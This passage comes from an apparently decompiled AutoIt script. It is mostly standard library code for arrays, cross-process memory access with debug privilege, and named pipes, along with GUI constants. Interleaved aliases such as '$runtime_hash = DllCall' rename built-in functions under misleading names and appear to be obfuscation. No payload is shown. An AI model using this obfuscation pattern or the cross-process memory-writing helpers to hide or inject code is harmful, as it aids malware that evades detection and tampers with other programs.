        $i -= 0x1
    WEnd
    $aidx[$i]+= 0x1
    For $j = $i + 0x1 To $ir + -1
        $aidx[$j] = $aidx[$i] + $j - $i
    Next
    $ileft -= 0x1
EndFunc    ; -> __Array_GetNext

Func __Array_MinMaxIndex(Const ByRef $AARRAY, $ICOMPNUMERIC, $ISTART, $IEND, $isubitem, $FUCOMPARISON)
    If $ICOMPNUMERIC = Default Then $ICOMPNUMERIC = 0x0
    If $ICOMPNUMERIC <> 0x1 Then $ICOMPNUMERIC = 0x0
    If $ISTART = Default Then $ISTART = 0x0
    If $IEND = Default Then $IEND = 0x0
    If $isubitem = Default Then $isubitem = 0x0
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS) + -1
    If $idim_1 < 0x0 Then Return SetError(0x1, 0x0, + -1)
    If $IEND = + -1 Then $IEND = $idim_1
    If $ISTART = + -1 Then $ISTART = 0x0
    If $ISTART < + -1 Or $IEND < + -1 Then Return SetError(0x3, 0x0, + -1)
    If $ISTART > $idim_1 Or $IEND > $idim_1 Then Return SetError(0x3, 0x0, + -1)
    If $ISTART > $IEND Then Return SetError(0x4, 0x0, + -1)
    If $idim_1 < 0x0 Then Return SetError(0x5, 0x0, + -1)
    Local $imaxminindex = $ISTART
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        If $ICOMPNUMERIC Then
            For $i = $ISTART To $IEND
                If $FUCOMPARISON(Number($AARRAY[$i]), Number($AARRAY[$imaxminindex])) Then $imaxminindex = $i
            Next
        Else
            For $i = $ISTART To $IEND
                If $FUCOMPARISON($AARRAY[$i], $AARRAY[$imaxminindex]) Then $imaxminindex = $i
            Next
        EndIf
    Case 0x2
        If $isubitem < 0x0 Or $isubitem > UBound($AARRAY, $UBOUND_COLUMNS) + -1 Then Return SetError(0x6, 0x0, + -1)
        If $ICOMPNUMERIC Then
            For $i = $ISTART To $IEND
                If $FUCOMPARISON(Number($AARRAY[$i][$isubitem]), Number($AARRAY[$imaxminindex][$isubitem])) Then $imaxminindex = $i
            Next
        Else
            For $i = $ISTART To $IEND
                If $FUCOMPARISON($AARRAY[$i][$isubitem], $AARRAY[$imaxminindex][$isubitem]) Then $imaxminindex = $i
            Next
        EndIf
    Case Else
        Return SetError(0x2, 0x0, + -1)
    EndSwitch
    Return $imaxminindex
EndFunc    ; -> __Array_MinMaxIndex

Func __Array_GreaterThan($vvalue1, $vvalue2)
    Return $vvalue1 > $vvalue2
EndFunc    ; -> __Array_GreaterThan

Func __Array_LessThan($vvalue1, $vvalue2)
    Return $vvalue1 < $vvalue2
EndFunc    ; -> __Array_LessThan

Func __ArrayUnique_AutoErrFunc()
EndFunc    ; -> __ArrayUnique_AutoErrFunc

$runtime_systemstack = DllStructCreate
$runtime_no_stack = _WinAPI_WaitForMultipleObjects
Global Const $GUI_EVENT_SINGLE = 0x0
Global Const $GUI_EVENT_ARRAY = 0x1
Global Const $GUI_EVENT_NONE = 0x0
Global Const $GUI_EVENT_CLOSE = + -3
Global Const $GUI_EVENT_MINIMIZE = + -4
Global Const $GUI_EVENT_RESTORE = + -5
Global Const $GUI_EVENT_MAXIMIZE = + -6
Global Const $GUI_EVENT_PRIMARYDOWN = + -7
Global Const $GUI_EVENT_PRIMARYUP = + -8
Global Const $GUI_EVENT_SECONDARYDOWN = + -9
Global Const $GUI_EVENT_SECONDARYUP = + -10
Global Const $GUI_EVENT_MOUSEMOVE = + -11
Global Const $GUI_EVENT_RESIZED = + -12
Global Const $GUI_EVENT_DROPPED = + -13
Global Const $GUI_RUNDEFMSG = "GUI_RUNDEFMSG"
Global Const $GUI_AVISTOP = 0x0
Global Const $GUI_AVISTART = 0x1
Global Const $GUI_AVICLOSE = 0x2
Global Const $GUI_CHECKED = 0x1
Global Const $GUI_INDETERMINATE = 0x2
Global Const $GUI_UNCHECKED = 0x4
Global Const $GUI_DROPACCEPTED = 0x8
Global Const $GUI_NODROPACCEPTED = 0x1000
Global Const $GUI_ACCEPTFILES = $GUI_DROPACCEPTED
Global Const $GUI_SHOW = 0x10
Global Const $GUI_HIDE = 0x20
Global Const $GUI_ENABLE = 0x40
Global Const $GUI_DISABLE = 0x80
Global Const $GUI_FOCUS = 0x100
Global Const $GUI_NOFOCUS = 0x2000
Global Const $GUI_DEFBUTTON = 0x200
Global Const $GUI_EXPAND = 0x400
Global Const $GUI_ONTOP = 0x800
Global Const $GUI_FONTNORMAL = 0x0
Global Const $GUI_FONTITALIC = 0x2
Global Const $GUI_FONTUNDER = 0x4
Global Const $GUI_FONTSTRIKE = 0x8
Global Const $GUI_DOCKAUTO = 0x1
Global Const $GUI_DOCKLEFT = 0x2
Global Const $GUI_DOCKRIGHT = 0x4
Global Const $GUI_DOCKHCENTER = 0x8
Global Const $GUI_DOCKTOP = 0x20
Global Const $GUI_DOCKBOTTOM = 0x40
Global Const $GUI_DOCKVCENTER = 0x80
Global Const $GUI_DOCKWIDTH = 0x100
Global Const $GUI_DOCKHEIGHT = 0x200
Global Const $GUI_DOCKSIZE = 0x300
Global Const $GUI_DOCKMENUBAR = 0x220
Global Const $GUI_DOCKSTATEBAR = 0x240
Global Const $GUI_DOCKALL = 0x322
Global Const $GUI_DOCKBORDERS = 0x66
Global Const $GUI_GR_CLOSE = 0x1
Global Const $GUI_GR_LINE = 0x2
Global Const $GUI_GR_BEZIER = 0x4
Global Const $GUI_GR_MOVE = 0x6
Global Const $GUI_GR_COLOR = 0x8
Global Const $GUI_GR_RECT = 0xa
Global Const $GUI_GR_ELLIPSE = 0xc
Global Const $GUI_GR_PIE = 0xe
Global Const $GUI_GR_DOT = 0x10
Global Const $GUI_GR_PIXEL = 0x12
Global Const $GUI_GR_HINT = 0x14
Global Const $GUI_GR_REFRESH = 0x16
Global Const $GUI_GR_PENSIZE = 0x18
Global Const $GUI_GR_NOBKCOLOR = + -2
Global Const $GUI_BKCOLOR_DEFAULT = + -1
Global Const $GUI_BKCOLOR_TRANSPARENT = + -2
Global Const $GUI_BKCOLOR_LV_ALTERNATE = -33554432
Global Const $GUI_READ_DEFAULT = 0x0
Global Const $GUI_READ_EXTENDED = 0x1
Global Const $GUI_CURSOR_NOOVERRIDE = 0x0
Global Const $GUI_CURSOR_OVERRIDE = 0x1
Global Const $GUI_WS_EX_PARENTDRAG = 0x100000
Global Const $PROCESS_TERMINATE = 0x1
Global Const $PROCESS_CREATE_THREAD = 0x2
Global Const $PROCESS_SET_SESSIONID = 0x4
Global Const $PROCESS_VM_OPERATION = 0x8
Global Const $PROCESS_VM_READ = 0x10
Global Const $PROCESS_VM_WRITE = 0x20
Global Const $PROCESS_DUP_HANDLE = 0x40
Global Const $PROCESS_CREATE_PROCESS = 0x80
Global Const $PROCESS_SET_QUOTA = 0x100
Global Const $PROCESS_SET_INFORMATION = 0x200
Global Const $PROCESS_QUERY_INFORMATION = 0x400
Global Const $PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
Global Const $PROCESS_SUSPEND_RESUME = 0x800
Global Const $PROCESS_ALL_ACCESS = 0x1f0fff
#Region Functions list
#EndRegion Functions list
#Region Global Variables and Constants
    Global Const $TAGMEMMAP = "handle hProc;ulong_ptr Size;ptr Mem"
#EndRegion Global Variables and Constants
#Region Public Functions
    Func _MemFree(ByRef $tmemmap)
        Local $pmemory = DllStructGetData($tmemmap, "Mem")
        Local $hprocess = DllStructGetData($tmemmap, "hProc")
        Local $bresult = _MemVirtualFreeEx($hprocess, $pmemory, 0x0, $MEM_RELEASE)
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hprocess)
        If @error Then Return SetError(@error, @extended, False)
        Return $bresult
    EndFunc    ; -> _MemFree

    Func _MemGlobalAlloc($ibytes, $iflags = 0x0)
        Local $acall = DllCall("kernel32.dll", "handle", "GlobalAlloc", "uint", $iflags, "ulong_ptr", $ibytes)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _MemGlobalAlloc

    Func _MemGlobalFree($hmemory)
        Local $acall = DllCall("kernel32.dll", "ptr", "GlobalFree", "handle", $hmemory)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _MemGlobalFree

    Func _MemGlobalLock($hmemory)
        Local $acall = DllCall("kernel32.dll", "ptr", "GlobalLock", "handle", $hmemory)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _MemGlobalLock

    Func _memglobalrealloc($hmemory, $ibytes, $iflags = 0x0)
        Local $aresult = DllCall("kernel32.dll", "handle", "GlobalReAlloc", "handle", $hmemory, "ulong_ptr", $ibytes, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $aresult[0x0]
    EndFunc    ; -> _memglobalrealloc

    Func _MemGlobalSize($hmemory)
        Local $acall = DllCall("kernel32.dll", "ulong_ptr", "GlobalSize", "handle", $hmemory)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _MemGlobalSize

    Func _MemGlobalUnlock($hmemory)
        Local $acall = DllCall("kernel32.dll", "bool", "GlobalUnlock", "handle", $hmemory)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _MemGlobalUnlock

    Func _MemInit($hwnd, $isize, ByRef $tmemmap)
        Local $acall = DllCall("user32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "dword*", 0x0)
        If @error Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $iprocessid = $acall[0x2]
        If $iprocessid = 0x0 Then Return SetError(0x1, 0x0, 0x0)
        Local $iaccess = BitOR($PROCESS_VM_OPERATION, $PROCESS_VM_READ, $PROCESS_VM_WRITE)
        Local $hprocess = __Mem_OpenProcess($iaccess, False, $iprocessid, True)
        Local $ialloc = BitOR($MEM_RESERVE, $MEM_COMMIT)
        Local $pmemory = _MemVirtualAllocEx($hprocess, 0x0, $isize, $ialloc, $PAGE_READWRITE)
        If $pmemory = 0x0 Then Return SetError(0x2, 0x0, 0x0)
        $tmemmap = DllStructCreate($TAGMEMMAP)
        DllStructSetData($tmemmap, "hProc", $hprocess)
        DllStructSetData($tmemmap, "Size", $isize)
        DllStructSetData($tmemmap, "Mem", $pmemory)
        Return $pmemory
    EndFunc    ; -> _MemInit

    Func _MemMoveMemory($psource, $pdest, $ilength)
        DllCall("kernel32.dll", "none", "RtlMoveMemory", "struct*", $pdest, "struct*", $psource, "ulong_ptr", $ilength)
        If @error Then Return SetError(@error, @extended)
    EndFunc    ; -> _MemMoveMemory

    Func _MemRead(ByRef $tmemmap, $psrce, $pdest, $isize)
        Local $acall = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", DllStructGetData($tmemmap, "hProc"), "ptr", $psrce, "struct*", $pdest, "ulong_ptr", $isize, "ulong_ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _MemRead

    Func _MemWrite(ByRef $tmemmap, $psrce, $pdest = 0x0, $isize = 0x0, $ssrce = "struct*")
        If $pdest = 0x0 Then $pdest = DllStructGetData($tmemmap, "Mem")
        If $isize = 0x0 Then $isize = DllStructGetData($tmemmap, "Size")
        Local $acall = DllCall("kernel32.dll", "bool", "WriteProcessMemory", "handle", DllStructGetData($tmemmap, "hProc"), "ptr", $pdest, $ssrce, $psrce, "ulong_ptr", $isize, "ulong_ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _MemWrite

    Func _MemVirtualAlloc($paddress, $isize, $iallocation, $iprotect)
        Local $acall = DllCall("kernel32.dll", "ptr", "VirtualAlloc", "ptr", $paddress, "ulong_ptr", $isize, "dword", $iallocation, "dword", $iprotect)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _MemVirtualAlloc

    Func _MemVirtualAllocEx($hprocess, $paddress, $isize, $iallocation, $iprotect)
        Local $acall = DllCall("kernel32.dll", "ptr", "VirtualAllocEx", "handle", $hprocess, "ptr", $paddress, "ulong_ptr", $isize, "dword", $iallocation, "dword", $iprotect)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _MemVirtualAllocEx

    Func _MemVirtualFree($paddress, $isize, $ifreetype)
        Local $acall = DllCall("kernel32.dll", "bool", "VirtualFree", "ptr", $paddress, "ulong_ptr", $isize, "dword", $ifreetype)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _MemVirtualFree

    Func _MemVirtualFreeEx($hprocess, $paddress, $isize, $ifreetype)
        Local $acall = DllCall("kernel32.dll", "bool", "VirtualFreeEx", "handle", $hprocess, "ptr", $paddress, "ulong_ptr", $isize, "dword", $ifreetype)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _MemVirtualFreeEx

#EndRegion Public Functions
#Region Internal Functions
    Func __Mem_OpenProcess($iaccess, $binherit, $ipid, $bdebugpriv = False)
        Local $acall = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $binherit, "dword", $ipid)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return $acall[0x0]
        If Not $bdebugpriv Then Return SetError(0x64, 0x0, 0x0)
        Local $htoken = _Security__OpenThreadTokenEx(BitOR($TOKEN_ADJUST_PRIVILEGES, $TOKEN_QUERY))
        If @error Then Return SetError(@error + 0xa, @extended, 0x0)
        _Security__SetPrivilege($htoken, $SE_DEBUG_NAME, True)
        Local $ierror = @error
        Local $iextended = @extended
        Local $iret = 0x0
        If Not @error Then
            $acall = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $binherit, "dword", $ipid)
            $ierror = @error
            $iextended = @extended
            If $acall[0x0] Then $iret = $acall[0x0]
            _Security__SetPrivilege($htoken, $SE_DEBUG_NAME, False)
            If @error Then
                $ierror = @error + 0x14
                $iextended = @extended
            EndIf
        Else
            $ierror = @error + 0x1e
        EndIf
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $htoken)
        Return SetError($ierror, $iextended, $iret)
    EndFunc    ; -> __Mem_OpenProcess

#EndRegion Internal Functions
$runtime_morestack = DllStructSetData
$runtime_newproc = _WinAPI_GetExitCodeProcess
$runtime_getg = DllStructGetPtr
$runtime_funcsize = DllStructGetSize
$funcptr = MsgBox
Global Const $PIPE_FLAG_FIRST_PIPE_INSTANCE = 0x1
Global Const $PIPE_FLAG_OVERLAPPED = 0x2
Global Const $PIPE_FLAG_WRITE_THROUGH = 0x4
Global Const $__FILE_FLAG_FIRST_PIPE_INSTANCE = 0x80000
Global Const $__FILE_FLAG_OVERLAPPED = 0x40000000
Global Const $__FILE_FLAG_WRITE_THROUGH = -2147483648
Global Const $__PIPE_ACCESS_INBOUND = 0x1
Global Const $__PIPE_ACCESS_OUTBOUND = 0x2
Global Const $__PIPE_ACCESS_DUPLEX = 0x3
Global Const $__PIPE_WAIT = 0x0
Global Const $__PIPE_NOWAIT = 0x1
Global Const $__PIPE_READMODE_BYTE = 0x0
Global Const $__PIPE_READMODE_MESSAGE = 0x2
Global Const $__PIPE_TYPE_BYTE = 0x0
Global Const $__PIPE_TYPE_MESSAGE = 0x4
Global Const $__PIPE_CLIENT_END = 0x0
Global Const $__PIPE_SERVER_END = 0x1
Global Const $__WRITE_DAC = 0x40000
Global Const $__WRITE_OWNER = 0x80000
Global Const $__ACCESS_SYSTEM_SECURITY = 0x1000000
Func _NamedPipes_CallNamedPipe($spipename, $pinpbuf, $iinpsize, $poutbuf, $ioutsize, ByRef $iread, $itimeout = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "CallNamedPipeW", "wstr", $spipename, "struct*", $pinpbuf, "dword", $iinpsize, "struct*", $poutbuf, "dword", $ioutsize, "dword*", 0x0, "dword", $itimeout)
    If @error Then Return SetError(@error, @extended, False)
    $iread = $acall[0x6]
    Return $acall[0x0]
EndFunc    ; -> _NamedPipes_CallNamedPipe

Func _NamedPipes_ConnectNamedPipe($hnamedpipe, $toverlapped = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "ConnectNamedPipe", "handle", $hnamedpipe, "struct*", $toverlapped)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc    ; -> _NamedPipes_ConnectNamedPipe

Func _NamedPipes_CreateNamedPipe($sname, $iaccess = 0x2, $iflags = 0x2, $iacl = 0x0, $itype = 0x1, $iread = 0x1, $iwait = 0x0, $imaxinst = 0x19, $ioutbufsize = 0x1000, $iinpbufsize = 0x1000, $idefaulttimeout = 0x1388, $tsecurity = 0x0)
    Local $iopenmode, $ipipemode
    Switch $iaccess
    Case 0x1
        $iopenmode = $__PIPE_ACCESS_OUTBOUND
    Case 0x2
        $iopenmode = $__PIPE_ACCESS_DUPLEX
    Case Else
        $iopenmode = $__PIPE_ACCESS_INBOUND
    EndSwitch
    If BitAND($iflags, 0x1) <> 0x0 Then $iopenmode = BitOR($iopenmode, $__FILE_FLAG_FIRST_PIPE_INSTANCE)
    If BitAND($iflags, 0x2) <> 0x0 Then $iopenmode = BitOR($iopenmode, $__FILE_FLAG_OVERLAPPED)
    If BitAND($iflags, 0x4) <> 0x0 Then $iopenmode = BitOR($iopenmode, $__FILE_FLAG_WRITE_THROUGH)
    If BitAND($iacl, 0x1) <> 0x0 Then $iopenmode = BitOR($iopenmode, $__WRITE_DAC)
    If BitAND($iacl, 0x2) <> 0x0 Then $iopenmode = BitOR($iopenmode, $__WRITE_OWNER)
    If BitAND($iacl, 0x4) <> 0x0 Then $iopenmode = BitOR($iopenmode, $__ACCESS_SYSTEM_SECURITY)
    Switch $itype
    Case 0x1
        $ipipemode = $__PIPE_TYPE_MESSAGE
    Case Else
        $ipipemode = $__PIPE_TYPE_BYTE
    EndSwitch
    Switch $iread
    Case 0x1
        $ipipemode = BitOR($ipipemode, $__PIPE_READMODE_MESSAGE)
    Case Else
        $ipipemode = BitOR($ipipemode, $__PIPE_READMODE_BYTE)
    EndSwitch
    Switch $iwait
    Case 0x1
        $ipipemode = BitOR($ipipemode, $__PIPE_NOWAIT)
    Case Else
        $ipipemode = BitOR($ipipemode, $__PIPE_WAIT)
    EndSwitch
    Local $acall = DllCall("kernel32.dll", "handle", "CreateNamedPipeW", "wstr", $sname, "dword", $iopenmode, "dword", $ipipemode, "dword", $imaxinst, "dword", $ioutbufsize, "dword", $iinpbufsize, "dword", $idefaulttimeout, "struct*", $tsecurity)
    If @error Then Return SetError(@error, @extended, + -1)
    Return $acall[0x0]
EndFunc    ; -> _NamedPipes_CreateNamedPipe

Func _NamedPipes_CreatePipe(ByRef $hwritepipe, ByRef $hwritepipe, $tsecurity = 0x0, $isize = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "CreatePipe", "handle*", 0x0, "handle*", 0x0, "struct*", $tsecurity, "dword", $isize)
    If @error Then Return SetError(@error, @extended, False)
    $hwritepipe = $acall[0x1]
    $hwritepipe = $acall[0x2]
    Return $acall[0x0]
EndFunc    ; -> _NamedPipes_CreatePipe

Func _NamedPipes_DisconnectNamedPipe($hnamedpipe)
    Local $acall = DllCall("kernel32.dll", "bool", "DisconnectNamedPipe", "handle", $hnamedpipe)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc    ; -> _NamedPipes_DisconnectNamedPipe

Func _NamedPipes_GetNamedPipeHandleState($hnamedpipe)
    Local $acall = DllCall("kernel32.dll", "bool", "GetNamedPipeHandleStateW", "handle", $hnamedpipe, "dword*", 0x0, "dword*", 0x0, "dword*", 0x0, "dword*", 0x0, "wstr", '', "dword", 0x1000)
    If @error Then Return SetError(@error, @extended, 0x0)
    Local $astate[0x6]
    $astate[0x0] = BitAND($acall[0x2], $__PIPE_NOWAIT) <> 0x0
    $astate[0x1] = BitAND($acall[0x2], $__PIPE_READMODE_MESSAGE) <> 0x0
    $astate[0x2] = $acall[0x3]
    $astate[0x3] = $acall[0x4]
    $astate[0x4] = $acall[0x5]
    $astate[0x5] = $acall[0x6]
    Return SetError(0x0, $acall[0x0], $astate)
EndFunc    ; -> _NamedPipes_GetNamedPipeHandleState

Func _NamedPipes_GetNamedPipeInfo($hnamedpipe)
    Local $acall = DllCall("kernel32.dll", "bool", "GetNamedPipeInfo", "handle", $hnamedpipe, "dword*", 0x0, "dword*", 0x0, "dword*", 0x0, "dword*", 0x0)
    If @error Then Return SetError(@error, @extended, 0x0)
    Local $ainfo[0x5]
    $ainfo[0x0] = BitAND($acall[0x2], $__PIPE_SERVER_END) <> 0x0
    $ainfo[0x1] = BitAND($acall[0x2], $__PIPE_TYPE_MESSAGE) <> 0x0
    $ainfo[0x2] = $acall[0x3]
    $ainfo[0x3] = $acall[0x4]
    $ainfo[0x4] = $acall[0x5]
    Return SetError(0x0, $acall[0x0], $ainfo)
EndFunc    ; -> _NamedPipes_GetNamedPipeInfo

Func _NamedPipes_PeekNamedPipe($hnamedpipe)
    Local $tbuffer = DllStructCreate("char Text[4096]")
    Local $acall = DllCall("kernel32.dll", "bool", "PeekNamedPipe", "handle", $hnamedpipe, "struct*", $tbuffer, "int", 0x1000, "dword*", 0x0, "dword*", 0x0, "dword*", 0x0)
    If @error Then Return SetError(@error, @extended, 0x0)
    Local $ainfo[0x4]
    $ainfo[0x0] = DllStructGetData($tbuffer, "Text")
    $ainfo[0x1] = $acall[0x4]
    $ainfo[0x2] = $acall[0x5]
    $ainfo[0x3] = $acall[0x6]
    Return SetError(0x0, $acall[0x0], $ainfo)
EndFunc    ; -> _NamedPipes_PeekNamedPipe

Func _NamedPipes_SetNamedPipeHandleState($hnamedpipe, $iread, $iwait, $ibytes = 0x0, $itimeout = 0x0)
    Local $imode = 0x0, $pbytes = 0x0, $ptimeout = 0x0
    Local $tint = DllStructCreate("dword Bytes;dword Timeout")
    If $iread = 0x1 Then $imode = BitOR($imode, $__PIPE_READMODE_MESSAGE)
    If $iwait = 0x1 Then $imode = BitOR($imode, $__PIPE_NOWAIT)
    If $ibytes <> 0x0 Then
        $pbytes = DllStructGetPtr($tint, "Bytes")
        DllStructSetData($tint, "Bytes", $ibytes)
    EndIf
    If $itimeout <> 0x0 Then
        $ptimeout = DllStructGetPtr($tint, "TimeOut")
        DllStructSetData($tint, "TimeOut", $itimeout)
    EndIf
    Local $acall = DllCall("kernel32.dll", "bool", "SetNamedPipeHandleState", "handle", $hnamedpipe, "dword*", $imode, "ptr", $pbytes, "ptr", $ptimeout)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc    ; -> _NamedPipes_SetNamedPipeHandleState

Func _NamedPipes_TransactNamedPipe($hnamedpipe, $pinpbuf, $iinpsize, $poutbuf, $ioutsize, $toverlapped = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "TransactNamedPipe", "handle", $hnamedpipe, "struct*", $pinpbuf, "dword", $iinpsize, "struct*", $poutbuf, "dword", $ioutsize, "dword*", 0x0, "struct*", $toverlapped)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return SetError(0x0, $acall[0x0], $acall[0x6])
EndFunc    ; -> _NamedPipes_TransactNamedPipe

Func _NamedPipes_WaitNamedPipe($spipename, $itimeout = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "WaitNamedPipeW", "wstr", $spipename, "dword", $itimeout)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc    ; -> _NamedPipes_WaitNamedPipe

$runtime_panic = DllStructGetData
Global Const $SS_LEFT = 0x0
Global Const $SS_CENTER = 0x1
Global Const $SS_RIGHT = 0x2
Global Const $SS_ICON = 0x3
Global Const $SS_BLACKRECT = 0x4
Global Const $SS_GRAYRECT = 0x5
Global Const $SS_WHITERECT = 0x6
Global Const $SS_BLACKFRAME = 0x7
Global Const $SS_GRAYFRAME = 0x8
Global Const $SS_WHITEFRAME = 0x9
Global Const $SS_SIMPLE = 0xb
Global Const $SS_LEFTNOWORDWRAP = 0xc
Global Const $SS_BITMAP = 0xe
Global Const $SS_ENHMETAFILE = 0xf
Global Const $SS_ETCHEDHORZ = 0x10
Global Const $SS_ETCHEDVERT = 0x11
Global Const $SS_ETCHEDFRAME = 0x12
Global Const $SS_REALSIZECONTROL = 0x40
Global Const $SS_NOPREFIX = 0x80
Global Const $SS_NOTIFY = 0x100
Global Const $SS_CENTERIMAGE = 0x200
Global Const $SS_RIGHTJUST = 0x400
Global Const $SS_SUNKEN = 0x1000
Global Const $GUI_SS_DEFAULT_LABEL = 0x0
Global Const $GUI_SS_DEFAULT_GRAPHIC = 0x0
Global Const $GUI_SS_DEFAULT_ICON = $SS_NOTIFY
Global Const $GUI_SS_DEFAULT_PIC = $SS_NOTIFY
Global Const $STM_SETICON = 0x170
Global Const $STM_GETICON = 0x171
Global Const $STM_SETIMAGE = 0x172
Global Const $STM_GETIMAGE = 0x173
$runtime_hash = DllCall
Global Const $WC_ANIMATE = "SysAnimate32"
Global Const $WC_BUTTON = "Button"
Global Const $WC_COMBOBOX = "ComboBox"
Global Const $WC_COMBOBOXEX = "ComboBoxEx32"
Global Const $WC_DATETIMEPICK = "SysDateTimePick32"
Global Const $WC_EDIT = "Edit"
Global Const $WC_HEADER = "SysHeader32"
Global Const $WC_HOTKEY = "msctls_hotkey32"
Global Const $WC_IPADDRESS = "SysIPAddress32"
Global Const $WC_LINK = "SysLink"
Global Const $WC_LISTBOX = "ListBox"
Global Const $WC_LISTVIEW = "SysListView32"
Global Const $WC_MONTHCAL = "SysMonthCal32"
Global Const $WC_NATIVEFONTCTL = "NativeFontCtl"
Global Const $WC_PAGESCROLLER = "SysPager"
Global Const $WC_PROGRESS = "msctls_progress32"
Global Const $WC_REBAR = "ReBarWindow32"
Global Const $WC_SCROLLBAR = "ScrollBar"
Global Const $WC_STATIC = "Static"
Global Const $WC_STATUSBAR = "msctls_statusbar32"
Global Const $WC_TABCONTROL = "SysTabControl32"
Global Const $WC_TOOLBAR = "ToolbarWindow32"
Global Const $WC_TOOLTIPS = "tooltips_class32"
Global Const $WC_TRACKBAR = "msctls_trackbar32"
Global Const $WC_TREEVIEW = "SysTreeView32"
Global Const $WC_UPDOWN = "msctls_updown32"
Global Const $WS_OVERLAPPED = 0x0
Global Const $WS_TILED = $WS_OVERLAPPED
Global Const $WS_MAXIMIZEBOX = 0x10000
Global Const $WS_MINIMIZEBOX = 0x20000
Global Const $WS_TABSTOP = 0x10000
Global Const $WS_GROUP = 0x20000
Global Const $WS_SIZEBOX = 0x40000
Global Const $WS_THICKFRAME = $WS_SIZEBOX
Global Const $WS_SYSMENU = 0x80000
Global Const $WS_HSCROLL = 0x100000
Global Const $WS_VSCROLL = 0x200000
Global Const $WS_DLGFRAME = 0x400000
Global Const $WS_BORDER = 0x800000
Global Const $WS_CAPTION = 0xc00000
Global Const $WS_OVERLAPPEDWINDOW = BitOR($WS_CAPTION, $WS_MAXIMIZEBOX, $WS_MINIMIZEBOX, $WS_OVERLAPPED, $WS_SYSMENU, $WS_THICKFRAME)
Global Const $WS_TILEDWINDOW = $WS_OVERLAPPEDWINDOW
Global Const $WS_MAXIMIZE = 0x1000000
Global Const $WS_CLIPCHILDREN = 0x2000000
Global Const $WS_CLIPSIBLINGS = 0x4000000
Global Const $WS_DISABLED = 0x8000000
Global Const $WS_VISIBLE = 0x10000000
Global Const $WS_MINIMIZE = 0x20000000
Global Const $WS_ICONIC = $WS_MINIMIZE
Global Const $WS_CHILD = 0x40000000
Global Const $WS_CHILDWINDOW = $WS_CHILD
Global Const $WS_POPUP = -2147483648
Global Const $WS_POPUPWINDOW = -2138570752
Global Const $DS_3DLOOK = 0x4
Global Const $DS_ABSALIGN = 0x1
Global Const $DS_CENTER = 0x800
Global Const $DS_CENTERMOUSE = 0x1000
Global Const $DS_CONTEXTHELP = 0x2000
Global Const $DS_CONTROL = 0x400
Global Const $DS_FIXEDSYS = 0x8
Global Const $DS_LOCALEDIT = 0x20
Global Const $DS_MODALFRAME = 0x80
Global Const $DS_NOFAILCREATE = 0x10
Global Const $DS_NOIDLEMSG = 0x100
Global Const $DS_SETFONT = 0x40
Global Const $DS_SETFOREGROUND = 0x200
Global Const $DS_SHELLFONT = BitOR($DS_FIXEDSYS, $DS_SETFONT)
Global Const $DS_SYSMODAL = 0x2
Global Const $WS_EX_ACCEPTFILES = 0x10
Global Const $WS_EX_APPWINDOW = 0x40000
Global Const $WS_EX_COMPOSITED = 0x2000000
Global Const $WS_EX_CONTROLPARENT = 0x10000
Global Const $WS_EX_CLIENTEDGE = 0x200
Global Const $WS_EX_CONTEXTHELP = 0x400
Global Const $WS_EX_DLGMODALFRAME = 0x1
Global Const $WS_EX_LAYERED = 0x80000
Global Const $WS_EX_LAYOUTRTL = 0x400000
Global Const $WS_EX_LEFT = 0x0
Global Const $WS_EX_LEFTSCROLLBAR = 0x4000
Global Const $WS_EX_LTRREADING = 0x0
Global Const $WS_EX_MDICHILD = 0x40
Global Const $WS_EX_NOACTIVATE = 0x8000000
Global Const $WS_EX_NOINHERITLAYOUT = 0x100000
Global Const $WS_EX_NOPARENTNOTIFY = 0x4
Global Const $WS_EX_NOREDIRECTIONBITMAP = 0x200000
Global Const $WS_EX_RIGHT = 0x1000
Global Const $WS_EX_RIGHTSCROLLBAR = 0x0
Global Const $WS_EX_RTLREADING = 0x2000
Global Const $WS_EX_STATICEDGE = 0x20000
Global Const $WS_EX_TOOLWINDOW = 0x80
Global Const $WS_EX_TOPMOST = 0x8
Global Const $WS_EX_TRANSPARENT = 0x20
Global Const $WS_EX_WINDOWEDGE = 0x100
